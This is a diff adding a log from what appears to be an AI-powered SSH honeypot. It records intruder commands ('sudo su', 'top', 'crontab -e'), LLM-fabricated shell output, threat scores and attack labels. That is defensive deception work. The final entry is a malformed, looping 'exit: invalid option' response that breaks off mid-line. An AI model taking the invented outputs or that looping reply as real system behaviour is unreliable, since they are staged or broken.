@@ -1,0 +1,2259 @@
+2026-07-07 15:01:40,582 - Logger Test
+2026-07-07 15:01:40,582 - {"session_id": "A102", "command": "sudo su", "attack_type": "Privilege Escalation", "risk_score": 82, "threat_level": "HIGH"}
+2026-07-07 15:01:40,583 - {
+    "session_id": "A102",
+    "command": "sudo su",
+    "ai_decision": "Privilege Escalation Detected",
+    "confidence_score": 0.96,
+    "conversation_metadata": {
+        "conversation_id": "SESSION_001",
+        "interaction_count": 7
+    },
+    "prediction_result": {
+        "next_prediction": "Credential Access",
+        "prediction_confidence": 0.89
+    },
+    "risk_score": 82,
+    "threat_level": "HIGH"
+}
+2026-07-07 15:01:40,583 - {
+    "session_id": "SESSION_101",
+    "conversation_log": "Attacker executed sudo su",
+    "ai_decision": "Privilege Escalation Attempt",
+    "session_metadata": {
+        "prediction": "Credential Access"
+    },
+    "system_event": "AI Response Generated",
+    "security_event": "Privilege Escalation",
+    "warning": "High Risk Command",
+    "error": null
+}
+2026-07-08 18:55:45,402 - {
+    "session_id": "263c7cc4",
+    "query": "top",
+    "response": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 1,
+        "risk_level": "LOW",
+        "final_score": 1,
+        "threat_level": "LOW",
+        "base_score": 1,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 1,
+            "unique_commands": 1,
+            "directories_visited": 0,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 5
+        },
+        "engagement": {
+            "session_duration": 0,
+            "commands_executed": 1,
+            "successful_commands": 1,
+            "failed_commands": 0,
+            "files_accessed": 0,
+            "services_accessed": 0,
+            "engagement_score": 4,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 5,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 1,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "top"
+        ],
+        "confidence_score": 0.55
+    }
+}
+2026-07-08 18:55:45,402 - {"session_id": "263c7cc4", "command": "top", "attack_type": "Unknown", "risk_score": 1, "threat_level": "LOW"}
+2026-07-08 18:55:45,402 - {
+    "session_id": "263c7cc4",
+    "command": "top",
+    "ai_decision": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
+    "confidence_score": 0.5,
+    "conversation_metadata": {
+        "conversation_id": "263c7cc4",
+        "interaction_count": 1
+    },
+    "prediction_result": {
+        "next_prediction": "Unknown",
+        "prediction_confidence": 0.5
+    },
+    "risk_score": 1,
+    "threat_level": "LOW"
+}
+2026-07-08 18:55:45,402 - {
+    "session_id": "263c7cc4",
+    "conversation_log": "Attacker executed: top",
+    "ai_decision": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
+    "session_metadata": {
+        "prediction": "Unknown"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Unknown",
+    "warning": null,
+    "error": null
+}
+2026-07-08 18:56:33,670 - {
+    "session_id": "263c7cc4",
+    "query": "crontab -e",
+    "response": "no crontab for ubuntu - using an empty one\n\nSelect an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        <---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n\nChoose 1-4 [1]:",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 13,
+        "risk_level": "LOW",
+        "final_score": 13,
+        "threat_level": "LOW",
+        "base_score": 13,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 2,
+            "unique_commands": 2,
+            "directories_visited": 0,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 10
+        },
+        "engagement": {
+            "session_duration": 48,
+            "commands_executed": 2,
+            "successful_commands": 2,
+            "failed_commands": 0,
+            "files_accessed": 0,
+            "services_accessed": 0,
+            "engagement_score": 28,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 10,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 13,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "top",
+            "crontab -e"
+        ],
+        "confidence_score": 0.6
+    }
+}
+2026-07-08 18:56:33,670 - {"session_id": "263c7cc4", "command": "crontab -e", "attack_type": "Persistence Attempt", "risk_score": 13, "threat_level": "LOW"}
+2026-07-08 18:56:33,670 - {
+    "session_id": "263c7cc4",
+    "command": "crontab -e",
+    "ai_decision": "no crontab for ubuntu - using an empty one\n\nSelect an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        <---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n\nChoose 1-4 [1]:",
+    "confidence_score": 0.9,
+    "conversation_metadata": {
+        "conversation_id": "263c7cc4",
+        "interaction_count": 2
+    },
+    "prediction_result": {
+        "next_prediction": "Persistence Attempt",
+        "prediction_confidence": 0.9
+    },
+    "risk_score": 13,
+    "threat_level": "LOW"
+}
+2026-07-08 18:56:33,670 - {
+    "session_id": "263c7cc4",
+    "conversation_log": "Attacker executed: crontab -e",
+    "ai_decision": "no crontab for ubuntu - using an empty one\n\nSelect an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        <---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n\nChoose 1-4 [1]:",
+    "session_metadata": {
+        "prediction": "Persistence Attempt"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Persistence Attempt",
+    "warning": null,
+    "error": null
+}
+2026-07-08 19:06:15,832 - {
+    "session_id": "fde8b933",
+    "query": "top",
+    "response": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 1,
+        "risk_level": "LOW",
+        "final_score": 1,
+        "threat_level": "LOW",
+        "base_score": 1,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 1,
+            "unique_commands": 1,
+            "directories_visited": 0,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 5
+        },
+        "engagement": {
+            "session_duration": 0,
+            "commands_executed": 1,
+            "successful_commands": 1,
+            "failed_commands": 0,
+            "files_accessed": 0,
+            "services_accessed": 0,
+            "engagement_score": 4,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 5,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 1,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "top"
+        ],
+        "confidence_score": 0.55
+    }
+}
+2026-07-08 19:06:15,832 - {"session_id": "fde8b933", "command": "top", "attack_type": "Unknown", "risk_score": 1, "threat_level": "LOW"}
+2026-07-08 19:06:15,832 - {
+    "session_id": "fde8b933",
+    "command": "top",
+    "ai_decision": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
+    "confidence_score": 0.5,
+    "conversation_metadata": {
+        "conversation_id": "fde8b933",
+        "interaction_count": 1
+    },
+    "prediction_result": {
+        "next_prediction": "Unknown",
+        "prediction_confidence": 0.5
+    },
+    "risk_score": 1,
+    "threat_level": "LOW"
+}
+2026-07-08 19:06:15,832 - {
+    "session_id": "fde8b933",
+    "conversation_log": "Attacker executed: top",
+    "ai_decision": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
+    "session_metadata": {
+        "prediction": "Unknown"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Unknown",
+    "warning": null,
+    "error": null
+}
+2026-07-08 19:07:45,220 - {
+    "session_id": "fde8b933",
+    "query": "crontab -e",
+    "response": "no crontab for ubuntu - using an empty one\n\nSelect an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        <---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n\nChoose 1-4 [1]:",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 13,
+        "risk_level": "LOW",
+        "final_score": 13,
+        "threat_level": "LOW",
+        "base_score": 13,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 2,
+            "unique_commands": 2,
+            "directories_visited": 0,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 10
+        },
+        "engagement": {
+            "session_duration": 89,
+            "commands_executed": 2,
+            "successful_commands": 2,
+            "failed_commands": 0,
+            "files_accessed": 0,
+            "services_accessed": 0,
+            "engagement_score": 28,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 10,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 13,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "top",
+            "crontab -e"
+        ],
+        "confidence_score": 0.6
+    }
+}
+2026-07-08 19:07:45,221 - {"session_id": "fde8b933", "command": "crontab -e", "attack_type": "Persistence Attempt", "risk_score": 13, "threat_level": "LOW"}
+2026-07-08 19:07:45,221 - {
+    "session_id": "fde8b933",
+    "command": "crontab -e",
+    "ai_decision": "no crontab for ubuntu - using an empty one\n\nSelect an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        <---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n\nChoose 1-4 [1]:",
+    "confidence_score": 0.9,
+    "conversation_metadata": {
+        "conversation_id": "fde8b933",
+        "interaction_count": 2
+    },
+    "prediction_result": {
+        "next_prediction": "Persistence Attempt",
+        "prediction_confidence": 0.9
+    },
+    "risk_score": 13,
+    "threat_level": "LOW"
+}
+2026-07-08 19:07:45,221 - {
+    "session_id": "fde8b933",
+    "conversation_log": "Attacker executed: crontab -e",
+    "ai_decision": "no crontab for ubuntu - using an empty one\n\nSelect an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        <---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n\nChoose 1-4 [1]:",
+    "session_metadata": {
+        "prediction": "Persistence Attempt"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Persistence Attempt",
+    "warning": null,
+    "error": null
+}
+2026-07-08 19:12:32,243 - {
+    "session_id": "fde8b933",
+    "query": "top",
+    "response": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 14,
+        "risk_level": "LOW",
+        "final_score": 14,
+        "threat_level": "LOW",
+        "base_score": 14,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 3,
+            "unique_commands": 2,
+            "directories_visited": 0,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 12
+        },
+        "engagement": {
+            "session_duration": 376,
+            "commands_executed": 3,
+            "successful_commands": 3,
+            "failed_commands": 0,
+            "files_accessed": 0,
+            "services_accessed": 0,
+            "engagement_score": 32,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 12,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 14,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "top",
+            "crontab -e",
+            "top"
+        ],
+        "confidence_score": 0.65
+    }
+}
+2026-07-08 19:12:32,244 - {"session_id": "fde8b933", "command": "top", "attack_type": "Unknown", "risk_score": 14, "threat_level": "LOW"}
+2026-07-08 19:12:32,244 - {
+    "session_id": "fde8b933",
+    "command": "top",
+    "ai_decision": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
+    "confidence_score": 0.5,
+    "conversation_metadata": {
+        "conversation_id": "fde8b933",
+        "interaction_count": 3
+    },
+    "prediction_result": {
+        "next_prediction": "Unknown",
+        "prediction_confidence": 0.5
+    },
+    "risk_score": 14,
+    "threat_level": "LOW"
+}
+2026-07-08 19:12:32,244 - {
+    "session_id": "fde8b933",
+    "conversation_log": "Attacker executed: top",
+    "ai_decision": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
+    "session_metadata": {
+        "prediction": "Unknown"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Unknown",
+    "warning": null,
+    "error": null
+}
+2026-07-17 11:50:53,407 - {
+    "session_id": "934c0467",
+    "query": "top",
+    "response": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 1,
+        "risk_level": "LOW",
+        "final_score": 1,
+        "threat_level": "LOW",
+        "base_score": 1,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 1,
+            "unique_commands": 1,
+            "directories_visited": 0,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 5
+        },
+        "engagement": {
+            "session_duration": 0,
+            "commands_executed": 1,
+            "successful_commands": 1,
+            "failed_commands": 0,
+            "files_accessed": 0,
+            "services_accessed": 0,
+            "engagement_score": 4,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 5,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 1,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "top"
+        ],
+        "confidence_score": 0.55
+    }
+}
+2026-07-17 11:50:53,407 - {"session_id": "934c0467", "command": "top", "attack_type": "Unknown", "risk_score": 1, "threat_level": "LOW"}
+2026-07-17 11:50:53,407 - {
+    "session_id": "934c0467",
+    "command": "top",
+    "ai_decision": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
+    "confidence_score": 0.5,
+    "conversation_metadata": {
+        "conversation_id": "934c0467",
+        "interaction_count": 1
+    },
+    "prediction_result": {
+        "next_prediction": "Reconnaissance",
+        "prediction_confidence": 0.5
+    },
+    "risk_score": 1,
+    "threat_level": "LOW"
+}
+2026-07-17 11:50:53,407 - {
+    "session_id": "934c0467",
+    "conversation_log": "Attacker executed: top",
+    "ai_decision": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
+    "session_metadata": {
+        "prediction": "Reconnaissance"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Unknown",
+    "warning": null,
+    "error": null
+}
+2026-07-17 11:55:18,260 - {
+    "session_id": "452255e6",
+    "query": "top\nexit",
+    "response": "exit\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' 